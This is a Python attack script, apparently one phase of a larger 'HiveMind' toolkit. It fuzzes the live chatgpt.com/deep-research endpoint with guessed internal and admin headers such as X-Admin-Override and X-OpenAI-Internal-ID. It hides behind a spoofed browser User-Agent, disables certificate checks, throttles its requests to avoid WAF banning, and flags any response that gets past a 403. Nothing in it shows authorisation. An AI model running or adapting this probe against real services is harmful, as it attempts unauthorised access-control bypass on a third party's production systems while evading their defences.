import os
import json
import subprocess
import sys
import time

# Ensure Zohar_Toolkit is in path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from HiveMind.HiveMind import HiveMind

class Phase14_HeaderInjection:
    def __init__(self):
        self.brain = HiveMind()
        self.arsenal = self.brain.get_arsenal()
        self.targets = ["https://chatgpt.com/deep-research"] # Targeted endpoint
        
        # We need a valid session to even get a 403 usually, or we mimic a fresh browser
        self.base_curl = [
            "curl", "-I", "-s", "-k", "--ssl-no-revoke",
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "-H", "Accept-Language: en-US,en;q=0.5",
            "-H", "Connection: keep-alive"
        ]

    def run(self):
        print("[*] Starting Phase 14: Targeted Header Injection on Deep Research...")
        
        # Headers to Fuzz
        # We take the discovered headers and try interesting values
        headers_to_try = {
            "X-Conduit-Token": ["true", "1", "admin", "debug", "test-token", "undefined", "null"],
            "OAI-Echo-Logs": ["true", "1", "on", "debug"],
            "X-OpenAI-Internal-ID": ["deep-research-admin", "canary-user", "internal-test"],
            "X-Admin-Override": ["true", "1"], # Speculative
            "OAI-Device-Id": ["d41d8cd9-8f00-b204-e980-0998ecf8427e"] # MD5 of empty string as placeholder
        }
        
        discovered_list = self.arsenal.get("discovered_headers", [])
        
        # Add discovered headers with generic fuzz values if not explicitly defined above
        for h in discovered_list:
            if h not in headers_to_try:
                headers_to_try[h] = ["true", "1", "debug"]

        target_url = "https://chatgpt.com/deep-research"
        self.brain.add_target(target_url, "Deep Research Landing Page")

        for header, values in headers_to_try.items():
            for val in values:
                print(f"[*] Testing {header}: {val} ...", end="\r")
                
                cmd = self.base_curl.copy()
                cmd.extend(["-H", f"{header}: {val}"])
                cmd.append(target_url)
                
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    output = result.stdout
                    
                    # Parse status code (curl -I output first line)
                    status_line = output.split('\n')[0] if output else "Unknown"
                    status_code = "Unknown"
                    if "HTTP" in status_line:
                        parts = status_line.split(' ')
                        if len(parts) > 1:
                            status_code = parts[1]

                    # Analyze
                    payload_preview = f"{header}: {val}"
                    self.brain.log_attempt(target_url, "Header Injection", status_code, payload_preview)
                    
                    if status_code not in ["403", "404", "Unknown"] or "200" in status_code:
                        print(f"\n[!] INTERESTING RESPONSE: {status_code} with {header}: {val}")
                        print(f"    Response Headers:\n{output[:200]}...")
                    
                    # Sleep slightly to avoid aggressive WAF banning
                    time.sleep(0.5)

                except Exception as e:
                    print(f"\n[!] Error executing curl: {e}")

        print("\n[*] Phase 14 Complete.")

if __name__ == "__main__":
    probe = Phase14_HeaderInjection()
    probe.run()
